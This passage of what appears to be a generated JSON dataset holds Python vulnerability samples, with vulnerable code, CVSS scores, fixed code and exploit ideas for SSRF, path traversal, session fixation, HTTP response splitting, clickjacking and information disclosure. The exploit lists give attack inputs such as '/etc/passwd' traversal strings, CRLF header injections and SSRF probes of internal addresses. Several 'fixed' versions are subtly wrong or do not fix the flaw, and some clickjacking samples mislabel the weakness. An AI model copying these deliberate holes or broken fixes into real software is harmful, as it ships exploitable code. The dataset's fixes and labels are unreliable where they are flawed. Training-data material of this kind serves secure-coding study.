        "vulnerability_code": "import logging\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\ndef log_user_data(user_id, user_email):\n    logging.debug(f'User ID: {user_id}, Email: {user_email}')",
        "cvss_score": 2.1,
        "fixed_code": "import logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\ndef log_user_data(user_id):\n    logging.info(f'User ID: {user_id}')",
        "exploit_ways": [
            "An attacker with access to the logs could retrieve sensitive user emails.",
            "If the system is compromised, an attacker could use the logs for further attacks on users.",
            "The logged information can be used in social engineering attempts."
        ]
    },
    "python_26": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "# Python example\ndef race_condition_example():\n    import threading\n    counter = 0\n    def increment():\n        global counter\n        for _ in range(1000):\n            temp = counter\n            temp += 1\n            counter = temp\n    threads = [threading.Thread(target=increment) for _ in range(10)]\n    for thread in threads:\n        thread.start()\n    for thread in threads:\n        thread.join()\n    print(f\"Final counter value: {counter}\")",
        "cvss_score": 5.3,
        "fixed_code": "# Python example\ndef race_condition_example():\n    import threading\n    counter = 0\n    lock = threading.Lock()\n    def increment():\n        nonlocal counter\n        for _ in range(1000):\n            with lock:\n                temp = counter\n                temp += 1\n                counter = temp\n    threads = [threading.Thread(target=increment) for _ in range(10)]\n    for thread in threads:\n        thread.start()\n    for thread in threads:\n        thread.join()\n    print(f\"Final counter value: {counter}\")",
        "exploit_ways": [
            "An attacker can run the script multiple times to observe inconsistent final counter values due to race conditions.",
            "By scheduling other high-load processes, an attacker could exacerbate the race condition for less predictable results.",
            "Crafting a scenario where resources are locked elsewhere and timing attacks could be used to manipulate the state of the counter."
        ]
    },
    "python_27": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "# Python example\nfrom flask import Flask, render_template_string\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    return render_template_string('<iframe src=\"https://malicious.com\" style=\"opacity:0;position:absolute;z-index:1000;width:100%;height:100%\"></iframe><h1>Welcome to our site!</h1>')",
        "cvss_score": 3.7,
        "fixed_code": "# Python example\nfrom flask import Flask, render_template_string\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    return render_template_string('<h1>Welcome to our site!</h1><meta http-equiv=\"X-Frame-Options\" content=\"DENY\">')",
        "exploit_ways": [
            "An attacker could embed the vulnerable page in a frame and trick users into clicking on hidden elements.",
            "Malicious actors can exploit this by overlaying interactive buttons or links without user knowledge.",
            "Users might inadvertently perform actions like liking, sharing, or downloading content from a malicious site."
        ]
    },
    "python_28": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "# Python example\ndef send_response(user_input):\n    response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\nHello, \" + user_input\n    return response",
        "cvss_score": 7.5,
        "fixed_code": "# Python example\ndef send_response(user_input):\n    import urllib.parse\n    safe_user_input = urllib.parse.quote(user_input)\n    response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\nHello, \" + safe_user_input\n    return response",
        "exploit_ways": [
            "An attacker can input 'Username\\r\\nSet-Cookie: SessionID=malicious' to inject cookies.",
            "They could use '\\r\\nLocation: http://attacker.com' for a redirection attack.",
            "Input like '\\r\\nContent-Length: 0' to manipulate the response length."
        ]
    },
    "python_29": {
        "vulnerability_type": "Session Fixation",
        "vulnerability_code": "class SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id, session_id):\n        if user_id not in self.sessions:\n            self.sessions[user_id] = session_id\n        return self.sessions[user_id]\n\n    def get_user(self, session_id):\n        for user_id, sid in self.sessions.items():\n            if sid == session_id:\n                return user_id\n        return None",
        "cvss_score": 4.0,
        "fixed_code": "import uuid\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id):\n        session_id = str(uuid.uuid4())\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def get_user(self, session_id):\n        return self.sessions.get(session_id)",
        "exploit_ways": [
            "An attacker could set a fixed session ID before the user logs in, capturing their session once authenticated.",
            "By manipulating session IDs, an attacker might take over a legitimate user's session if they guess or predict the session identifier.",
            "Attacker can force a target user to use a specific session ID via various means like phishing links containing a predetermined session token."
        ]
    },
    "python_30": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "# Python example\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id, session_id):\n        if session_id not in self.sessions:\n            self.sessions[session_id] = {\"user_id\": user_id}\n        return self.sessions[session_id]\n\n    def get_user_by_session(self, session_id):\n        return self.sessions.get(session_id, {}).get(\"user_id\")",
        "cvss_score": 4.2,
        "fixed_code": "# Python example\nclass SessionManager:\n    import uuid\n\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id):\n        session_id = str(uuid.uuid4())\n        self.sessions[session_id] = {\"user_id\": user_id}\n        return session_id\n\n    def get_user_by_session(self, session_id):\n        return self.sessions.get(session_id, {}).get(\"user_id\")",
        "exploit_ways": [
            "An attacker can provide a predetermined session ID to the server, hijacking an existing session if it exists.",
            "If the session ID is predictable or reused, attackers could guess and use valid session IDs to gain unauthorized access.",
            "By controlling the session ID assignment process on the client side, attackers might influence the server to associate their requests with legitimate sessions."
        ]
    },
    "python_31": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "from flask import Flask, render_template_string\ndef get_hidden_iframe():\n    return '<iframe src=\"https://malicious-site.com\" style=\"position:absolute; top:-100px; left:-100px;\"></iframe>'\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    template = get_hidden_iframe() + \"<h1>Welcome to the site!</h1>\"\n    return render_template_string(template)\nif __name__ == '__main__':\n    app.run(debug=True)",
        "cvss_score": 3.5,
        "fixed_code": "from flask import Flask, render_template_string\napp = Flask(__name__)\n@app.after_request\ndef add_header(response):\n    response.headers['X-Frame-Options'] = 'DENY'\n    return response\n@app.route('/')\ndef index():\n    template = \"<h1>Welcome to the site!</h1>\"\n    return render_template_string(template)\nif __name__ == '__main__':\n    app.run(debug=True)",
        "exploit_ways": [
            "An attacker could overlay a hidden iframe over a legitimate button to trick users into clicking on it without their knowledge.",
            "Users can be manipulated into performing actions on the malicious site while thinking they are interacting with the trusted site.",
            "The malicious site could use the user's interaction to perform unauthorized actions on behalf of the user."
        ]
    },
    "python_32": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "class RedirectHandler:\\n    def __init__(self, url):\\n        self.url = url\\n    def redirect(self):\\n        import webbrowser\\n        webbrowser.open(self.url)",
        "cvss_score": 6.5,
        "fixed_code": "class RedirectHandler:\\n    def __init__(self, url):\\n        self.url = self.sanitize_url(url)\\n    def sanitize_url(self, url):\\n        import urllib.parse\\n        parsed_url = urllib.parse.urlparse(url)\\n        if parsed_url.scheme in ('http', 'https') and parsed_url.netloc:\\n            return url\\n        raise ValueError('Invalid URL')\\n    def redirect(self):\\n        import webbrowser\\n        webbrowser.open(self.url)",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://attacker.com' to redirect users away from the intended site.",
            "They could use a crafted URL with additional parameters or paths to access unintended pages, such as 'https://legitimate.com/redirect?to=http://malicious.com'.",
            "By using a data URL scheme like 'data:text/html;base64,...', an attacker can inject HTML content directly into the browser."
        ]
    },
    "python_33": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import os\nclass FileReader:\n    def __init__(self, path):\n        self.path = path\n    def read_file(self):\n        file_path = os.path.join(os.getcwd(), self.path)\n        with open(file_path, 'r') as file:\n            return file.read()",
        "cvss_score": 5.0,
        "fixed_code": "import os\nclass FileReader:\n    def __init__(self, path):\n        self.path = self.sanitize_path(path)\n    def sanitize_path(self, path):\n        allowed_dir = os.getcwd()\n        full_path = os.path.abspath(os.path.join(allowed_dir, path))\n        if not full_path.startswith(allowed_dir):\n            raise ValueError(\"Path is outside of the allowed directory\")\n        return path\n    def read_file(self):\n        file_path = os.path.join(os.getcwd(), self.path)\n        with open(file_path, 'r') as file:\n            return file.read()",
        "exploit_ways": [
            "An attacker can input '../../../../etc/passwd' to read the system's password file.",
            "They could try accessing 'config.ini' to retrieve sensitive configuration details.",
            "Input like '../../../var/log/nginx/access.log' might leak web server access logs."
        ]
    },
    "python_34": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "from flask import Flask, request, redirect\napp = Flask(__name__)\ndef validate_url(url):\n    allowed_domains = [\"example.com\", \"test.com\"]\n    for domain in allowed_domains:\n        if url.startswith(f'http://{domain}') or url.startswith(f'https://{domain}\"):\n            return True\n    return False\n@app.route('/redirect')\ndef redirect_to_url():\n    next_url = request.args.get('next', '')\n    if validate_url(next_url):\n        return redirect(next_url)\n    else:\n        return 'Invalid URL'\nif __name__ == '__main__':\n    app.run(debug=True)",
        "cvss_score": 6.5,
        "fixed_code": "from flask import Flask, request, redirect\napp = Flask(__name__)\ndef validate_url(url):\n    from urllib.parse import urlparse\n    allowed_domains = {\"example.com\", \"test.com\"}\n    parsed_url = urlparse(url)\n    if parsed_url.netloc in allowed_domains:\n        return True\n    return False\n@app.route('/redirect')\ndef redirect_to_url():\n    next_url = request.args.get('next', '')\n    if validate_url(next_url):\n        return redirect(next_url)\n    else:\n        return 'Invalid URL'\nif __name__ == '__main__':\n    app.run(debug=True)",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing a valid-looking URL like http://example.com/evil",
            "They could exploit it with crafted URLs including port numbers and paths to trick users into thinking they are staying on the same domain.",
            "Using URL encoding in the query parameters, attackers can obfuscate malicious URLs, making them harder to detect."
        ]
    },
    "python_35": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "# Python example\nimport time\ndef slow_function():\n    while True:\n        for i in range(100000):\n            pass\n        time.sleep(0.1)\ndef trigger_dos():\n    if input('Enter secret key: ') == 'secret':\n        slow_function()",
        "cvss_score": 4.5,
        "fixed_code": "# Python example\nimport time\ndef slow_function():\n    for i in range(10):\n        pass\ndef trigger_dos():\n    if input('Enter secret key: ') == 'secret':\n        slow_function()",
        "exploit_ways": [
            "An attacker can continuously call the function to keep the server busy.",
            "Inputting the correct secret key will activate the infinite loop, causing a denial of service locally.",
            "The vulnerability can be used in scripts to exhaust system resources over time."
        ]
    },
    "python_36": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "class UserInfo:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def get_info(self):\n        return f\"Username: {self.username}, Password: {self.password}\"",
        "cvss_score": 4.0,
        "fixed_code": "class UserInfo:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def get_info(self):\n        return f\"Username: {self.username}, Password: ********\"",
        "exploit_ways": [
            "An attacker can access the object's attributes and retrieve sensitive information like passwords.",
            "Through debugging or logging, an attacker might see the output of get_info() revealing passwords.",
            "If this class is used in a web application, user data could be exposed in error messages or logs."
        ]
    },
    "python_37": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "class HttpResponseSplitter:\n    def set_header(self, header_value):\n        self.header = f\"Content-Type: text/html\\r\\n{header_value}\\r\\n\"",
        "cvss_score": 6.1,
        "fixed_code": "import re\nclass HttpResponseSplitter:\n    def set_header(self, header_value):\n        if re.search(r'\\r|\\n', header_value):\n            raise ValueError('Invalid header value')\n        self.header = f\"Content-Type: text/html\\r\\n{header_value}\\r\\n\"",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: exploit=true' to manipulate cookies.",
            "They could use '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Exploit</h1>' to inject a new response.",
            "By injecting '\\r\\nLocation: http://malicious.com', the attacker could perform open redirection."
        ]
    },
    "python_38": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "# Python example\ndef serve_content():\n    response = \"<html><body>Hello, world!</body></html>\"\n    return response",
        "cvss_score": 3.1,
        "fixed_code": "# Python example\ndef serve_content():\n    response = \"<html><body>Hello, world!</body></html>\"\n    headers = {\n        'Content-Security-Policy': \"default-src 'self'\",\n        'X-Content-Type-Options': 'nosniff',\n        'X-Frame-Options': 'SAMEORIGIN',\n        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'\n    }\n    return (response, headers)",
        "exploit_ways": [
            "An attacker can inject malicious scripts due to the absence of Content Security Policy.",
            "Lack of X-Frame-Options could allow clickjacking attacks.",
            "Without Strict-Transport-Security, man-in-the-middle attacks are more feasible."
        ]
    },
    "python_39": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "import os\n\ndef read_secret_file():\n    try:\n        with open('/etc/secret', 'r') as file:\n            data = file.read()\n            if len(data) > 100:\n                print('File too large to display.')\n            else:\n                print('Secret Data:', data)\n    except FileNotFoundError:\n        print('File not found.')",
        "cvss_score": 3.5,
        "fixed_code": "import os\n\ndef read_secret_file():\n    try:\n        with open('/etc/secret', 'r') as file:\n            data = file.read()\n            if len(data) > 100:\n                print('File too large to display.')\n            else:\n                # Log data instead of printing\n                import logging\n                logging.basicConfig(filename='app.log', level=logging.INFO)\n                logging.info('Secret Data: %s', data)\n    except FileNotFoundError:\n        print('File not found.')",
        "exploit_ways": [
            "An attacker with access to the application's output can read sensitive information from the console or logs.",
            "If the file contains API keys or passwords, these could be exposed and used maliciously by an attacker.",
            "In environments where the application is accessible over a network, attackers might intercept the output to steal secrets."
        ]
    },
    "python_40": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import os\nfrom flask import Flask, request\ndef read_file(file_path):\n    with open(os.path.join('documents', file_path), 'r') as file:\n        return file.read()\napp = Flask(__name__)\n@app.route('/view')\ndef view():\n    file_name = request.args.get('file')\n    if not file_name or '..' in file_name or '\\\\' in file_name:\n        return 'Invalid file name', 400\n    try:\n        content = read_file(file_name)\n        return content\n    except FileNotFoundError:\n        return 'File not found', 404",
        "cvss_score": 5.3,
        "fixed_code": "import os\nfrom flask import Flask, request\ndef read_file(file_path):\n    with open(os.path.join('documents', file_path), 'r') as file:\n        return file.read()\napp = Flask(__name__)\nALLOWED_FILES = {'report.txt', 'summary.pdf'}\n@app.route('/view')\ndef view():\n    file_name = request.args.get('file')\n    if not file_name or file_name not in ALLOWED_FILES:\n        return 'Invalid file name', 400\n    try:\n        content = read_file(file_name)\n        return content\n    except FileNotFoundError:\n        return 'File not found', 404",
        "exploit_ways": [
            "An attacker can exploit the code to access files like 'secret.txt' within the 'documents' directory by guessing filenames.",
            "Using '..%2F..%2F..' sequences might still bypass checks if additional filtering isn't in place (though mitigated here).",
            "If file path construction is complex, attackers could use URL-encoded characters to probe and access unintended files."
        ]
    },
    "python_41": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "# Python example\ndef read_file(path):\n    import os\n    base_dir = \"/safe/directory/\"\n    safe_path = os.path.join(base_dir, path)\n    if base_dir in safe_path:\n        with open(safe_path, 'r') as file:\n            return file.read()\n    else:\n        return \"Access denied\"",
        "cvss_score": 4.3,
        "fixed_code": "# Python example\ndef read_file(path):\n    import os\n    base_dir = \"/safe/directory/\"\n    safe_path = os.path.join(base_dir, path.lstrip('/\\\\'))\n    if os.path.commonpath([base_dir, safe_path]) == base_dir:\n        with open(safe_path, 'r') as file:\n            return file.read()\n    else:\n        return \"Access denied\"",
        "exploit_ways": [
            "An attacker can input a relative path like '../../etc/passwd' to read sensitive files.",
            "Using URL-encoded sequences such as '%2e%2e/' in the path may bypass basic filtering attempts.",
            "Crafting requests with double slashes or directory traversal techniques to reach unauthorized files."
        ]
    },
    "python_42": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "from flask import Flask, render_template\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)",
        "cvss_score": 6.8,
        "fixed_code": "from flask import Flask, render_template, make_response\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    resp = make_response(render_template('index.html'))\n    resp.headers['Content-Security-Policy'] = \"default-src 'self'\"\n    resp.headers['X-Content-Type-Options'] = 'nosniff'\n    resp.headers['X-Frame-Options'] = 'SAMEORIGIN'\n    resp.headers['X-XSS-Protection'] = '1; mode=block'\n    return resp\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the website to perform XSS attacks.",
            "By exploiting missing security headers, an attacker can frame the web application in another site without any restriction.",
            "Without Content-Type sniffing protection, attackers could force browsers to misinterpret files as being of a different MIME type."
        ]
    },
    "python_43": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "# Python example\nimport uuid\n\ndef create_session():\n    session_id = str(uuid.uuid4())\n    if 'HTTP_COOKIE' in os.environ:\n        cookie = http.cookies.SimpleCookie(os.environ['HTTP_COOKIE'])\n        if 'session_id' in cookie:\n            session_id = cookie['session_id'].value\n    return session_id",
        "cvss_score": 4.2,
        "fixed_code": "# Python example\nimport uuid\nimport os\nimport http.cookies\n\ndef create_session():\n    session_id = str(uuid.uuid4())\n    if 'HTTP_COOKIE' in os.environ:\n        cookie = http.cookies.SimpleCookie(os.environ['HTTP_COOKIE'])\n        if 'session_id' in cookie:\n            # Regenerate session ID to prevent fixation\n            new_session_id = str(uuid.uuid4())\n            return new_session_id\n    return session_id",
        "exploit_ways": [
            "An attacker can set a fixed session ID in the cookie and trick the user into logging in, gaining control over their session.",
            "If the session is tied to sensitive actions, an attacker could perform those actions on behalf of the victim using the fixed session ID.",
            "Attackers can use session fixation to log out users by invalidating sessions they do not control."
        ]
    },
    "python_44": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import requests\\nfrom flask import Flask, request\\napp = Flask(__name__)\\n\\ndef fetch_url(url):\\n    try:\\n        response = requests.get(url)\\n        return response.text\\n    except Exception as e:\\n        return str(e)\\n\\n@app.route('/fetch')\\ndef fetch_endpoint():\\n    url = request.args.get('url', '')\\n    if '://' not in url:\\n        url = 'http://' + url\\n    if not (url.startswith('http://example.com/') or url.startswith('https://example.com/')):\\n        return 'Invalid URL'\\n    return fetch_url(url)\\n\\nif __name__ == '__main__':\\n    app.run(debug=False, host='0.0.0.0', port=5000)",
        "cvss_score": 6.3,
        "fixed_code": "import requests\\nfrom flask import Flask, request\\napp = Flask(__name__)\\n\\ndef fetch_url(url):\\n    try:\\n        response = requests.get(url)\\n        return response.text\\n    except Exception as e:\\n        return str(e)\\n\\n@app.route('/fetch')\\ndef fetch_endpoint():\\n    url = request.args.get('url', '')\\n    if '://' not in url:\\n        url = 'http://' + url\\n    base_url = 'https://example.com/'\\n    if not url.startswith(base_url):\\n        return 'Invalid URL'\\n    sanitized_url = base_url + url[len(base_url):]\\n    return fetch_url(sanitized_url)\\n\\nif __name__ == '__main__':\\n    app.run(debug=False, host='0.0.0.0', port=5000)",
        "exploit_ways": [
            "An attacker could craft a URL like 'http://example.com/../../etc/passwd' to read local files.",
            "Using the vulnerability, an attacker might attempt to access internal services by specifying a URL that routes to an internal IP address or hostname, e.g., 'https://example.com/@hostname.internal/service'.",
            "An attacker could potentially exploit SSRF to perform DNS rebinding attacks, where they manipulate DNS records to point back to the server and possibly execute commands or retrieve sensitive data."
        ]
    },
    "python_45": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import requests\nclass Fetcher:\n    def __init__(self, url):\n        self.url = url\n    def get_content(self):\n        response = requests.get(self.url)\n        return response.text",
        "cvss_score": 6.5,
        "fixed_code": "import requests\nfrom urllib.parse import urlparse\nclass Fetcher:\n    def __init__(self, url):\n        self.url = url\n        parsed_url = urlparse(url)\n        if not (parsed_url.scheme in ['http', 'https'] and parsed_url.netloc in ['allowed.example.com']):\n            raise ValueError('Invalid URL')\n    def get_content(self):\n        response = requests.get(self.url)\n        return response.text",
        "exploit_ways": [
            "An attacker could specify an internal IP address to access internal services not exposed externally.",
            "They might use file:// URLs to read local files on the server if the application does not properly sanitize inputs.",
            "Crafting a URL with a slow host (slowloris) could be used for denial-of-service attacks."
        ]
    },
    "python_46": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import requests\ndef fetch_url(url):\n    response = requests.get(url)\n    return response.text",
        "cvss_score": 6.5,
        "fixed_code": "import requests\nfrom urllib.parse import urlparse\nALLOWED_DOMAINS = {\"example.com\", \"safe.domain\"}\ndef fetch_url(url):\n    parsed_url = urlparse(url)\n    if parsed_url.netloc in ALLOWED_DOMAINS:\n        response = requests.get(url)\n        return response.text\n    else:\n        raise ValueError(\"Domain not allowed\")",
        "exploit_ways": [
            "An attacker can use the vulnerability to request internal network resources by providing an internal IP address.",
            "They could fetch sensitive data from other services hosted on the same server or local network.",
            "By using a technique like DNS rebinding, attackers might be able to access unintended domains or services."
        ]
    },
    "python_47": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "# Python example\ndef show_secrets():\n    secret_data = {\"username\": \"admin\", \"password\": \"12345\"}\n    print(secret_data)",
        "cvss_score": 2.0,
        "fixed_code": "# Python example\ndef show_secrets():\n    # No longer prints sensitive information\n    pass",
        "exploit_ways": [
            "An attacker can execute the function to retrieve username and password.",
            "This could be used for unauthorized access if the credentials are reused elsewhere.",
            "If logged, the output could leak sensitive data through system logs or console output."
        ]
    },
    "python_48": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "# Python example\nimport requests\ndef fetch_url(url):\n    if not url.startswith('http'):\n        raise ValueError('URL must be HTTP or HTTPS')\n    response = requests.get(url)\n    return response.text",
        "cvss_score": 6.5,
        "fixed_code": "# Python example\nimport requests\nfrom urllib.parse import urlparse\ndef fetch_url(url):\n    allowed_domains = ['example.com', 'another-example.com']\n    parsed_url = urlparse(url)\n    if not url.startswith('http') or parsed_url.netloc not in allowed_domains:\n        raise ValueError('URL must be HTTP, HTTPS and belong to an allowed domain')\n    response = requests.get(url)\n    return response.text",
        "exploit_ways": [
            "An attacker can use the SSRF vulnerability to request internal resources like http://localhost:8080/admin.",
            "Exploiter might try accessing a file on the server using a URL like http://127.0.0.1/etc/passwd.",
            "Could abuse the SSRF to scan for open ports or services on the same network by using URLs like http://192.168.1.x/."
        ]
    },
    "python_49": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "import os\nimport http.cookies\n\ndef handle_request(environ, start_response):\n    if 'HTTP_COOKIE' in environ:\n        cookie = http.cookies.SimpleCookie(environ['HTTP_COOKIE'])\n        session_id = cookie.get('session_id')\n        if not session_id:\n            session_id = os.urandom(16).hex()\n            response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\n        else:\n            response_headers = []\n    else:\n        session_id = os.urandom(16).hex()\n        response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\n\n    response_body = b'Hello, world!'\n    start_response('200 OK', response_headers)\n    return [response_body]",
        "cvss_score": 3.6,
        "fixed_code": "import os\nimport http.cookies\n\ndef handle_request(environ, start_response):\n    session_id = None\n    if 'HTTP_COOKIE' in environ:\n        cookie = http.cookies.SimpleCookie(environ['HTTP_COOKIE'])\n        session_id = cookie.get('session_id')\n    if not session_id or not is_valid_session(session_id.value):\n        session_id = os.urandom(16).hex()\n        response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\n    else:\n        response_headers = []\n\n    response_body = b'Hello, world!'\n    start_response('200 OK', response_headers)\n    return [response_body]\n\ndef is_valid_session(session_id):\n    # Implement session validation logic here\n    return False",
        "exploit_ways": [
            "An attacker can provide a fixed session ID to the server, and if accepted, hijack the user's session.",
            "By manipulating cookies in a web browser, an attacker could attempt to reuse valid session IDs from another user.",
            "In environments where sessions are not properly invalidated, an attacker might be able to exploit fixed sessions to maintain unauthorized access."
        ]
    }
}